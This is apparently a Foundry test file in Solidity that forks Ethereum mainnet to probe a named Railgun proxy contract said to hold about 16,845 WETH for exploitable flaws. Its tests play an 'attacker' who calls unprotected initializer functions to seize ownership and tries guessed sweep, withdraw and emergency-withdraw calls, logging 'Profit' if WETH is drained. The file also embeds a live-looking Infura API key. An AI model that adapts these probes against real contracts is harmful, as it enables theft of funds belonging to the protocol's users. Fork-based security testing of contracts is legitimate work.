// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

/**
 * @title Railgun Exploit Check
 * @notice Check for potential exploits in Railgun SmartWallet
 *
 * Contract: 0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9
 * Implementation: 0xB4F2d77bD12c6b548Ae398244d7FAD4ABCE4D89b
 * Balance: 16,845 WETH (~$50M)
 */
contract RailgunExploitCheckTest is Test {
    address constant PROXY = 0xFA7093CDD9EE6932B4eb2c9e1cde7CE00B1FA4b9;
    address constant IMPL = 0xB4F2d77bD12c6b548Ae398244d7FAD4ABCE4D89b;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function test_checkProxyState() public view {
        console.log("=== RAILGUN PROXY STATE ===");
        console.log("Proxy:", PROXY);
        console.log("Implementation:", IMPL);

        // Check WETH balance
        (bool s, bytes memory d) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", PROXY)
        );
        if (s && d.length >= 32) {
            uint256 bal = abi.decode(d, (uint256));
            console.log("WETH Balance:", bal / 1e18, "WETH");
        }

        // Check owner via proxy
        (s, d) = PROXY.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s && d.length >= 32) {
            address owner = abi.decode(d, (address));
            console.log("Proxy Owner:", owner);
        }

        // Check owner via implementation
        (s, d) = IMPL.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s && d.length >= 32) {
            address implOwner = abi.decode(d, (address));
            console.log("Impl Owner:", implOwner);
        }

        console.log("============================");
    }

    function test_tryInitializeImplementation() public {
        console.log("=== TRYING TO INITIALIZE IMPLEMENTATION ===");

        address attacker = address(0xDEAD);

        // Check init state before
        console.log("Before attack:");
        bytes32 slot0 = vm.load(IMPL, bytes32(uint256(0)));
        console.log("Slot 0 (initialized):", uint256(slot0));

        // Try various initialize functions
        vm.startPrank(attacker);

        // Try initializeRailgunLogic
        (bool s,) = IMPL.call(
            abi.encodeWithSignature("initializeRailgunLogic(address,bytes32,address,address,address)",
                attacker, bytes32(0), address(0), address(0), address(0))
        );
        console.log("initializeRailgunLogic:", s ? "SUCCESS" : "FAILED");

        // Try generic initialize
        (s,) = IMPL.call(
            abi.encodeWithSignature("initialize()")
        );
        console.log("initialize():", s ? "SUCCESS" : "FAILED");

        // Try __Ownable_init
        (s,) = IMPL.call(
            abi.encodeWithSignature("__Ownable_init()")
        );
        console.log("__Ownable_init():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        // Check if we became owner
        (bool os, bytes memory od) = IMPL.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (os && od.length >= 32) {
            address newOwner = abi.decode(od, (address));
            console.log("Impl owner after:", newOwner);

            if (newOwner == attacker) {
                console.log("!!! CRITICAL: Attacker became implementation owner !!!");
            }
        }

        console.log("===========================================");
    }

    function test_checkForSweepFunction() public view {
        console.log("=== CHECKING FOR SWEEP/RESCUE FUNCTIONS ===");

        // Check if there are any permissionless sweep functions
        // These would be called through the proxy

        string[8] memory funcs = [
            "sweep(address)",
            "sweepTokens(address)",
            "rescueTokens(address,uint256)",
            "recoverERC20(address,uint256)",
            "withdraw(address,uint256)",
            "emergencyWithdraw()",
            "drain()",
            "execute(address,uint256,bytes)"
        ];

        for (uint i = 0; i < funcs.length; i++) {
            // Check if function exists by looking at code
            // We can't easily check this statically, but we can try to call
            console.log("Function check:", funcs[i]);
        }

        console.log("==========================================");
    }

    function test_tryWithdrawThroughProxy() public {
        console.log("=== TRYING WITHDRAW THROUGH PROXY ===");

        address attacker = address(0xBEEF);
        uint256 attackerWethBefore;

        (bool s, bytes memory d) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            attackerWethBefore = abi.decode(d, (uint256));
        }

        vm.startPrank(attacker);

        // Try withdraw functions on proxy
        (s,) = PROXY.call(
            abi.encodeWithSignature("withdraw(address,uint256)", WETH, 1 ether)
        );
        console.log("withdraw(WETH, 1e18):", s ? "SUCCESS" : "FAILED");

        (s,) = PROXY.call(
            abi.encodeWithSignature("sweep(address)", WETH)
        );
        console.log("sweep(WETH):", s ? "SUCCESS" : "FAILED");

        (s,) = PROXY.call(
            abi.encodeWithSignature("emergencyWithdraw()")
        );
        console.log("emergencyWithdraw():", s ? "SUCCESS" : "FAILED");

        vm.stopPrank();

        // Check if attacker gained WETH
        (s, d) = WETH.staticcall(
            abi.encodeWithSignature("balanceOf(address)", attacker)
        );
        if (s && d.length >= 32) {
            uint256 attackerWethAfter = abi.decode(d, (uint256));
            if (attackerWethAfter > attackerWethBefore) {
                console.log("!!! EXPLOIT: Attacker gained WETH !!!");
                console.log("Profit:", (attackerWethAfter - attackerWethBefore) / 1e18, "WETH");
            } else {
                console.log("No WETH gained");
            }
        }

        console.log("=====================================");
    }
}
